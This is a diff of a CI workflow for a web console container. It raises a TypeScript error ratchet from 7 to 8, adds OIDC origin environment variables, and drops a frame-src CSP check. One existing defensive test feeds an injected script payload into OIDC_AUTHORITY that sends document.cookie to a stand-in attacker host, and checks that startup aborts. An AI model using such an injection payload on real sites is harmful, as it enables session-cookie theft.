@@ -84,20 +84,20 @@ jobs:
         # would turn every PR red on day one.
         #
         # A ratchet is used instead of a non-blocking informational run, because a step
-        # that can never fail is not a check. This one fails the moment an eighth error
+        # that can never fail is not a check. This one fails the moment a ninth error
         # appears, which is the regression worth catching, and stays green until then.
-        # Its known weakness: it counts errors, so it would not notice 7 errors being
-        # traded for 7 different ones. That is an accepted trade for a gate that can go
+        # Its known weakness: it counts errors, so it would not notice 8 errors being
+        # traded for 8 different ones. That is an accepted trade for a gate that can go
         # in today; the fix is to drive the baseline to 0 and make tsc blocking.
         #
-        # BASELINE: 7. Every tsc diagnostic emits its file:line prefix and "error TSxxxx"
+        # BASELINE: 8. Every tsc diagnostic emits its file:line prefix and "error TSxxxx"
         # on ONE line -- continuation lines (e.g. "Property 'future' does not exist...")
         # are indented and carry no "error TS" -- so the grep count is exactly the
         # diagnostic count. Lower this number when errors are fixed; the step tells you
         # when it is stale.
         run: |
           set -e
-          BASELINE=7
+          BASELINE=8
           echo "::group::npx tsc --noEmit"
           # tsc exits non-zero whenever there is at least one error, which is the normal
           # state here, so its exit code carries no information -- the count does.
@@ -157,6 +157,8 @@ jobs:
             -e OIDC_CLIENT_ID=ci-client \
             -e "OIDC_AUTHORITY=$IDP_ORIGIN/application/o/iverson/" \
             -e "API_BASE_URL=$API_ORIGIN" \
+            -e EXTERNAL_SCHEME=http \
+            -e "OIDC_ORIGIN=$IDP_ORIGIN" \
             "$IMAGE"
 
           # nginx accepts connections a moment before it serves them -- an unretried
@@ -198,7 +200,7 @@ jobs:
             case " $_line " in
               *" $_origin "*) echo "OK: $_directive names $_origin" ;;
               *)
-                echo "::error::the Content-Security-Policy's $_directive does not name $_origin. The console cannot reach an origin its CSP omits: connect-src without the admin-api origin breaks every widget fetch and the OTLP export, connect-src without the Authentik origin breaks OIDC discovery and the token exchange so login cannot complete, and frame-src without it blocks the iframe silent-renew fallback."
+                echo "::error::the Content-Security-Policy's $_directive does not name $_origin. The console cannot reach an origin its CSP omits: connect-src without the admin-api origin breaks every widget fetch and the OTLP export, connect-src without the Authentik origin breaks OIDC discovery and the token exchange so login cannot complete."
                 echo "served: $CSP"
                 exit 1
                 ;;
@@ -207,7 +209,6 @@ jobs:
 
           assert_directive_names connect-src "$API_ORIGIN"
           assert_directive_names connect-src "$IDP_ORIGIN"
-          assert_directive_names frame-src "$IDP_ORIGIN"
 
       - name: A malformed value must abort startup instead of reaching config.js
         # The payload puts the double quote in the URL's PATH, not its host. That is
@@ -230,6 +231,8 @@ jobs:
             -e OIDC_CLIENT_ID=ci-client \
             -e 'OIDC_AUTHORITY=http://authentik.ci.invalid/";fetch("http://attacker.ci.invalid/"+document.cookie);"' \
             -e "API_BASE_URL=$API_ORIGIN" \
+            -e EXTERNAL_SCHEME=http \
+            -e "OIDC_ORIGIN=$IDP_ORIGIN" \
             "$IMAGE" 2>&1)
           RC=$?
           set -e
